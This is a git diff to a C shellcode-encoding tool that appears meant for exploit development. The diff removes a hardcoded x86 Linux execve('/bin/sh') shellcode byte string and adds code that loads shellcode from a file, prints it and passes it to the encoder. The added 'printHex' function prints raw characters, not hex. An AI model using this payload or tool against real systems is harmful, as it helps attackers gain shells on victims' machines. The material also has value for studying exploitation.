@@ -57,16 +57,34 @@ void setZero();
 void printNOP();
 void printComment(int target);
 void printAddESP();
+void printHex(char *shellcode);
 
 int main(int argc, char *argv[]){
 		if (argc != 3){
-			showHelp(argv[0]);
-			exit(1);
+				showHelp(argv[0]);
+				exit(1);
 		}
+		char *filename = argv[1];
+		char *start = argv[2];
+		char shellcode[4096] = {0};
+		FILE *file = fopen(filename, "r");
+		fread(shellcode, 1, 4096, file);
+		fclose(file);
 
-		char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80";
-		build(shellcode, 0x20); // 设置参数似乎并没用
+		printf("[START_ASCII] : [%c]\n", *start);
+		printf("[SHELLCODE_FILE_NAME] : [%s]\n", filename);
+		printf("[SHELLCODE] : ");
+		printHex(shellcode);
+		printf("[SHELLCODE_LENGTH] : %d\n", strlen(shellcode));
+		build(shellcode, 0x20);
 		return 0;
+}
+
+void printHex(char *shellcode){
+		while (*shellcode){
+				printf("%c", *shellcode++); 
+		}
+		printf("\n");
 }
 
 unsigned char *getMAX(unsigned char *a, unsigned char *b, unsigned char *c){
@@ -233,16 +251,16 @@ unsigned char * build(char * shellcode, char start){
 
 
 void showHelp(char *filename){
-	printf("Usage : \n");
-	printf("\t%s [SHELLCODE_FILE_NAME] [START_ASCII]\n", filename);
-	printf("Examples : \n");
-	printf("\t%s ./shellcode.dat A\n", filename);
-	printf("Note : \n");
-	printf("\tIf you have any questions, please send an email to me.(wangyihanger@gmail.com)\n");
-	printf("\tMy honor to help you with your problem.\n");
-	printf("Author : \n");
-	printf("\tWangYihang\n");
-	printf("Date : \n");
-	printf("\t2017/03/21\n");
+		printf("Usage : \n");
+		printf("\t%s [SHELLCODE_FILE_NAME] [START_ASCII]\n", filename);
+		printf("Examples : \n");
+		printf("\t%s ./shellcode.dat A\n", filename);
+		printf("Note : \n");
+		printf("\tIf you have any questions, please send an email to me.(wangyihanger@gmail.com)\n");
+		printf("\tMy honor to help you with your problem.\n");
+		printf("Author : \n");
+		printf("\tWangYihang\n");
+		printf("Date : \n");
+		printf("\t2017/03/21\n");
 }
 
